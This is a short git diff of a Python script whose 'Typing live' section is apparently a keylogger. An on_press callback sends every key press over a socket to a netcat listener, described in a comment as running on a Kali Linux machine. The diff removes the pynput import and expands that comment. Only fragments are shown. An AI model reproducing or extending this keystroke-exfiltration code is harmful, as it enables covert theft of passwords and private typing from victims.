@@ -60,7 +60,6 @@ print(f"Filtered results saved to {output_file_path}")
 
 # ===================================================== Typing live ==============================================================
 
-from pynput import keyboard
 import socket
 
 # Netcat server details
@@ -87,7 +86,7 @@ def send_key_to_netcat(key):
         print(f"Error: {e}")
 
 
-# Callback function for key press
+# Callback function for key press --> each time a key is pressed it will send it to netcat in the kali linux machine
 def on_press(key):
     send_key_to_netcat(key)
 
